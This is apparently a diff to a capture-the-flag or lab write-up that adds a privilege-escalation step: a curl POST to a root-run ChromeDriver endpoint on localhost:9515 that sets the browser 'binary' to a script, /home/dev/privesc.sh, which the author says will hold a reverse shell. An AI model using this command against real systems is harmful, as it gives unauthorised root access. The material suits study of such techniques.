@@ -446,3 +446,11 @@ It looks as if there is a way to make a post request to the local endpoint to ex
 
 So i could simply make a bash script with a revshell inside and then execute it using this method to get a root shell, this is becuase the process itself is running as root
 
+```python
+curl -X POST localhost:9515/session -d {"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary":"/home/dev/privesc.sh", "args":["test"]}}}}
+```
+
+This is the command i have compiled using the article
+
+Now ill create the binary 
+
